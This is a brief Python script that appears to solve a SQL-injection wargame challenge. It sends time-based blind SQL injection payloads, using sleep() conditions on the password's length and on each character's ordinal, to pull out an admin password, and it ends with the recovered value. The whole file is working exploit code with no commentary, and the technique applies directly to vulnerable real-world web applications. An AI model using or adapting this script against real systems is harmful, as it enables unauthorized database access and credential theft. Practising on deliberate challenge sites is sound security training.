import time
import requests

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookies = {'PHPSESSID': 'i03snlmnog6a9dj1rct4p2b96i'}

flag = ""

for i in range(1,20):
    query = url+"?id=admin'%26%26if((length(pw)="+str(i)+"),sleep(2),1)%23"
    time1 = time.time()
    response = requests.get(query, cookies=cookies)
    time2 = time.time()
    print(response.url)
    if((time2-time1)>2):
        length = i
        print("[+]Find length! : ",str(i))
        break

for i in range(1,length+1):
    for j in range(33,127):
        query = url+"?id=admin'%26%26if((ord(substr(pw,"+str(i)+",1))="+str(j)+"),sleep(2),1)%23"
        time1 = time.time()
        response = requests.get(query, cookies=cookies)
        time2 = time.time()
        print(response.url)
        if((time2-time1)>2):
            flag += chr(j)
            print("[+]Find Key! :",chr(j))
            break

print(flag)

# sovle : d948b8a0